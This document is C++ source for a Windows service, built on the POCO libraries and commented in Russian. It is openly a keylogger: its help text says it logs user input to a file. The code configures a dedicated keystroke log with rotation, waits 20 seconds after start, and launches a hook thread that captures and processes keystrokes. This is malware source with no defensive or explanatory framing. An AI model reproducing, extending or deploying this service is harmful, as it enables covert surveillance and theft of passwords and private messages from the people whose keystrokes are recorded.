#include <Windows.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include "Poco/Util/WinService.h"
#include "Poco/Util/WinRegistryKey.h"
#include "Poco/Util/AbstractConfiguration.h"
#include "Poco/Util/XMLConfiguration.h"
#include "Poco/Util/Application.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/HelpFormatter.h"
#include "Poco/Util/ServerApplication.h"
#include "Poco/Util/LoggingSubsystem.h"
#include "Poco/Util/PropertyFileConfiguration.h"
#include "Poco/PatternFormatter.h"
#include "Poco/FileChannel.h"
#include "Poco/FormattingChannel.h"
#include "Poco/SplitterChannel.h"
#include "Poco/Path.h"
#include "Poco/FileStream.h"
#include "Poco/DateTimeFormatter.h"
#include "KeyloggerService.h"
#include <Poco/UnicodeConverter.h>
#include "Poco/ConsoleChannel.h"
#include "WorkerThread.h"
#include "KeyResolver.h"
#include "WordProcessor.h"
#include "NullGuardProcessor.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/OptionProcessor.h"
#include <Poco/Process.h>
#include <Poco/Pipe.h>
#include <sddl.h>
#include <thread>
using namespace Poco;

using Poco::SystemException;

using Poco::Util::WinRegistryKey;
using Poco::Util::AbstractConfiguration;
using Poco::Util::XMLConfiguration;
using Poco::Util::Application;
using Poco::Util::Option;
using Poco::Util::OptionSet;
using Poco::Util::HelpFormatter;
using Poco::Util::ServerApplication;
using Poco::Util::LoggingSubsystem;
using Poco::Path;
using Poco::FileOutputStream;
using Poco::DateTimeFormatter;

KeyloggerService::KeyloggerService() : _helpRequested(false) {}


void KeyloggerService::initialize(Application& self)
{
    std::string appPath = Poco::Path(commandPath()).parent().toString();

    loadConfiguration(appPath + "KeyloggerService.properties"); // загрузить конфигурацию из файла или из командной строки
    ServerApplication::initialize(self);

    /*Logger& logger = Logger::get("TestLogger");
    logger.information("This is an informational message");
    logger.warning("This is a warning message");*/

    std::string loggerName = config().getString("application.logger.name");
    std::string logLevel = config().getString("application.logger.level", "debug");
    std::string logFile = config().getString("application.logger.file", "mylog.log");
    std::string rotationLog = config().getString("application.logger.rotation");
    std::string patternLog = config().getString("application.logger.pattern");

    std::string keylogLevel = config().getString("application.keylogger.level", "debug");
    std::string keylogFile = config().getString("application.keylogger.file", "mylog.log");
    std::string keyrotationLog = config().getString("application.keylogger.rotation");
    std::string keypatternLog = config().getString("application.keylogger.pattern");
    /*
    * Создание логера приложения
    */
    AutoPtr<FileChannel> pChannel(new FileChannel);
    pChannel->setProperty("path", appPath + logFile);
    pChannel->setProperty("rotation", "2 K");
    pChannel->setProperty("archive", "timestamp");
    Poco::AutoPtr<Poco::PatternFormatter> pPatern(new Poco::PatternFormatter);
    pPatern->setProperty("pattern", patternLog);
    Poco::AutoPtr<Poco::FormattingChannel> pAppLoggerFormatterChannel(new Poco::FormattingChannel(pPatern, pChannel));
    Logger::get("AppLogger").setChannel(pAppLoggerFormatterChannel);
    Logger::get("AppLogger").setLevel(logLevel);
    /*
    * Создание логера кейлогера
    */
    AutoPtr<FileChannel> pChannelKeylog(new FileChannel);
    pChannelKeylog->setProperty("path", appPath + keylogFile);
    pChannelKeylog->setProperty("rotation", "2 K");
    pChannelKeylog->setProperty("archive", "timestamp");
    Poco::AutoPtr<Poco::PatternFormatter> pPaternKeylog(new Poco::PatternFormatter);
    pPaternKeylog->setProperty("pattern", keypatternLog);
    Poco::AutoPtr<Poco::FormattingChannel> pKeyloggerLoggerFormatterChannel(new Poco::FormattingChannel(pPaternKeylog, pChannelKeylog));
    Logger::get("KeyLogger").setChannel(pKeyloggerLoggerFormatterChannel);
    Logger::get("KeyLogger").setLevel(logLevel);
    
    //Logger* l = &Poco::Util::Application::instance().logger().get("AppLogger");
    //for (int i = 0; i < 100; ++i)
    //    l->information("Testing FileChannel");
    //Logger* l2 = &Poco::Util::Application::instance().logger().get("KeyLogger");
    //for (int i = 0; i < 100; ++i)
    //    l2->information("Testing FileChannel2");
}

void KeyloggerService::uninitialize()
{
    ServerApplication::uninitialize();
}

void KeyloggerService::defineOptions(OptionSet& options)
{
    ServerApplication::defineOptions(options);

    options.addOption(
        Option("help", "h", "display help information on command line arguments")
        .required(false)
        .repeatable(false));

    options.addOption(
        Poco::Util::Option("run", "r", "Run mode")
        //.callback(Poco::Util::OptionCallback<KeyloggerService>(this, &KeyloggerService::handleOption))
        .noArgument()
    );
}

void KeyloggerService::handleOption(const std::string& name, const std::string& value)
{
    ServerApplication::handleOption(name, value);

    if (name == "help")
        _helpRequested = true;
}

void KeyloggerService::displayHelp()
{
    HelpFormatter helpFormatter(options());
    helpFormatter.setCommand(commandName());
    helpFormatter.setUsage("OPTIONS");
    helpFormatter.setHeader("A keylogger Windows service that logs user input to a file.");
    helpFormatter.format(std::cout);
}

int KeyloggerService::main(const std::vector<std::string>& args)
{
    if (_helpRequested)
    {
        displayHelp();
        return Application::EXIT_OK;
    }
    std::this_thread::sleep_for(std::chrono::seconds(20));

    doneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    KeyResolver keyResolver;
    NullGuardProcessor gProcessor;
    WordProcessor wProcessor(&gProcessor);
    WorkerThread wc(doneEvent, &keyResolver, &wProcessor);
    // чтобы мы могли остановить сервис нам нужно CreateHookThread сделать detach
    wc.CreateHookThread();

    waitForTerminationRequest();
    // здесь нужно вызвать у HookThread функцию стоп
    SetEvent(doneEvent);

    return Application::EXIT_OK;
}

POCO_SERVER_MAIN(KeyloggerService)